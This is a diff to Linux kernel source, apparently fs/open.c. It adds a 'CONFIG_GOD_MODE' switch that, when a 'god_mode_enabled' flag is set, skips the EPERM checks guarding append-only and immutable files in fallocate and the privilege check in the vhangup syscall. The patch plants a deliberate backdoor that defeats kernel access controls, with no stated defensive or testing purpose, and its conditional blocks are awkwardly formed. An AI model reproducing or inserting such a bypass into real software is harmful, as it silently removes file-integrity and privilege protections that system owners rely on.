@@ -239,10 +239,26 @@ int do_fallocate(struct file *file, int mode, loff_t offset, loff_t len)
 
 	/* It's not possible punch hole on append only file */
 	if (mode & FALLOC_FL_PUNCH_HOLE && IS_APPEND(inode))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	if (IS_IMMUTABLE(inode))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	/*
 	 * Revalidate the write permissions, in case security policy has
@@ -1110,7 +1126,15 @@ SYSCALL_DEFINE0(vhangup)
 		tty_vhangup_self();
 		return 0;
 	}
-	return -EPERM;
+	
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 }
 
 /*
